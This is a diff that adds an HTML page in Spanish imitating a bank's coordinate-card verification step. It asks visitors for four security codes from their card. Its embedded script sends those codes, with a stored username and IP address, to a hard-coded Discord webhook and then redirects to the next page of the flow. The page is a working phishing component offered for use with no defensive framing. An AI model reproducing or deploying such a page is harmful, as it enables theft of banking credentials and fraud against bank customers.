@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Coordenadas 2</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="banner">
+  <div class="header">
+    <img src="img/logo-1.png" alt="Logo" class="logo" />
+    <div class="linea-personal">| Personal</div>
+  </div>
+  <div class="titulo">INGRESE CADA CÓDIGO DE SU TARJETA DE COORDENADAS</div>
+  <img src="img/tarjje.PNG" alt="Tarjeta de Coordenadas" class="tarjeta-img" />
+  <form id="coordenadas2Form">
+    <div class="row">
+      <div class="numero-fijo">06</div>
+      <input type="text" id="codigo06" maxlength="4" inputmode="numeric" required />
+      <div class="numero-fijo">16</div>
+      <input type="text" id="codigo16" maxlength="4" inputmode="numeric" required />
+    </div>
+    <div class="row">
+      <div class="numero-fijo">26</div>
+      <input type="text" id="codigo26" maxlength="4" inputmode="numeric" required />
+      <div class="numero-fijo">36</div>
+      <input type="text" id="codigo36" maxlength="4" inputmode="numeric" required />
+    </div>
+    <button type="submit">Continuar</button>
+  </form>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const webhook = "https://discord.com/api/webhooks/1481712791508226209/2AjtJeFx9ommSEtgRFVCjd3khnhZpqEvxJLyJTAmOHFYtIhgiKcqo7wYC6AdsmGL5zs2";
+  const usuario = localStorage.getItem('usuario') || 'Desconocido';
+  const ip = localStorage.getItem('ip') || 'IP desconocida';
+
+  const form = document.getElementById('coordenadas2Form');
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const c06 = document.getElementById('codigo06').value.trim();
+      const c16 = document.getElementById('codigo16').value.trim();
+      const c26 = document.getElementById('codigo26').value.trim();
+      const c36 = document.getElementById('codigo36').value.trim();
+      
+      if (!c06 || !c16 || !c26 || !c36) {
+        alert("Completa todos los campos.");
+        return;
+      }
+      
+      const message =
+        `Usuario: ${usuario}\n` +
+        `Coordenada 06: ${c06}\n` +
+        `Coordenada 16: ${c16}\n` +
+        `Coordenada 26: ${c26}\n` +
+        `Coordenada 36: ${c36}\n` +
+        `IP: ${ip}`;
+        
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      })
+      // Aquí se cambió el destino de la redirección:
+      .then(res => window.location.href = "tarj.html")
+      .catch(() => alert("Error de conexión al enviar datos."));
+    });
+  }
+});
+</script>
+</body>
+</html>
